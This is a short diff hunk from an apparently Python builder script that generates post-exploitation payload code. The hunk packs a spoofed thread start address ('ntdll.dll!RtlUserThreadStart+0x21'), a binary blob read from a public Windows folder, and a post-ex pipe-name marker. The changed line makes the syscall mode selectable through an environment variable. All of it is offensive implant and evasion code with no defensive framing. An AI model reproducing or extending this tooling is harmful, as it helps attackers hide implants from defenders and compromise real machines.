@@ -64,7 +64,7 @@ if __name__ == "__main__":
         "    _wire = open(r'C:\\\\Users\\\\Public\\\\bt_hello_kitfull_wire.bin','rb').read() + struct.pack('>i',0)\n"
         "else:\n"
         "    _wire = H.FULL + struct.pack('>i',0)\n"
-        "ARGS = (struct.pack('>i',1)+struct.pack('>i',2)+struct.pack('>i',1)"
+        "ARGS = (struct.pack('>i',1)+struct.pack('>i',2)+struct.pack('>i',int(_os.environ.get('KIT_SYSCALL','1')))"
         "+H.L(b'ntdll.dll!RtlUserThreadStart+0x21\\x00')"
         "+H.L(OUT.encode()+b'\\x00')+H.L(_wire))\n"
         "PIPEMARK = b'POST_EX_PIPE_NAME_PLEASE_DO_NOT_CHANGE_OR_REMOVE'\n"
